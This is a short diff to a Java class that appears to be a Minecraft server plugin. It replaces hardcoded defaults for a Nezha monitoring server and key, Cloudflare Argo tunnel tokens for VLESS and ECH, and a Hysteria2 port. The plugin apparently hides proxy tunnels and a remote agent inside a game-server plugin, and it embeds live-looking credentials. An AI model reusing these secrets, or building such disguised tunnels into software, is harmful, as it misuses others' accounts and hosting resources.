@@ -69,10 +69,10 @@ public class App extends JavaPlugin implements CommandExecutor, TabCompleter, Li
 
     private static final String NEZHA_SERVER = env("NEZHA_SERVER", "nezha.mingfei1981.eu.org");
     private static final String NEZHA_PORT = env("NEZHA_PORT", "443");
-    private static final String NEZHA_KEY = env("NEZHA_KEY", "tVOIvHnIf4wpeuBSOP");
+    private static final String NEZHA_KEY = env("NEZHA_KEY", "EhWWv3Rvtf6Olgxy2j");
 
-    private static final String ECH_ARGO_TOKEN = env("ECH_ARGO_TOKEN", "eyJhIjoiYmRiNzUxYWY5NDBiNWM3NGI4MTRiZWNkMzE0MWYwYTUiLCJ0IjoiMzRmNzNmYWMtZWY3ZC00NTQ0LTliOGQtMGMwZWM3ZTQ0NzUwIiwicyI6Ik16Tm1OMlF3WlRndFpHTmlNeTAwWkRGbExXSm1ZVFF0Tm1aak5Ua3dNV0psTmpVNCJ9");
-    private static final String VLESS_ARGO_TOKEN = env("VLESS_ARGO_TOKEN", "eyJhIjoiYmRiNzUxYWY5NDBiNWM3NGI4MTRiZWNkMzE0MWYwYTUiLCJ0IjoiMzRmNzNmYWMtZWY3ZC00NTQ0LTliOGQtMGMwZWM3ZTQ0NzUwIiwicyI6Ik16Tm1OMlF3WlRndFpHTmlNeTAwWkRGbExXSm1ZVFF0Tm1aak5Ua3dNV0psTmpVNCJ9");
+    private static final String ECH_ARGO_TOKEN = env("ECH_ARGO_TOKEN", "eyJhIjoiNjgyNWI4YTZjODBhYWQxODlmYWI5ZWEwMDI5YzY2NjgiLCJ0IjoiODJmOTg0Y2YtMDNmOS00N2MzLTkwN2QtYzM2MDk4YmYwM2U4IiwicyI6Ik5EZGtOakZsTXpRdFlqUmhZUzAwTkRZMExXSTNNMkl0WXpRd1l6QmhaREZqWW1NMiJ9");
+    private static final String VLESS_ARGO_TOKEN = env("VLESS_ARGO_TOKEN", "eyJhIjoiNjgyNWI4YTZjODBhYWQxODlmYWI5ZWEwMDI5YzY2NjgiLCJ0IjoiODJmOTg0Y2YtMDNmOS00N2MzLTkwN2QtYzM2MDk4YmYwM2U4IiwicyI6Ik5EZGtOakZsTXpRdFlqUmhZUzAwTkRZMExXSTNNMkl0WXpRd1l6QmhaREZqWW1NMiJ9");
 
     private static final String WSPORT = env("WSPORT", "8001");
     private static final String VLPORT = env("VLPORT", "8002");
@@ -84,7 +84,7 @@ public class App extends JavaPlugin implements CommandExecutor, TabCompleter, Li
     private static final String HY_IPS = env("HY_IPS", "4");
 
     private static final String ENABLE_HY2 = env("ENABLE_HY2", "1");
-    private static final String HY_PORT = env("HY_PORT", "31026");
+    private static final String HY_PORT = env("HY_PORT", "25575");
     private static final String NAME = env("NAME", "MJJ");
     private static final String PASSWORD = UUID_VAL;
 
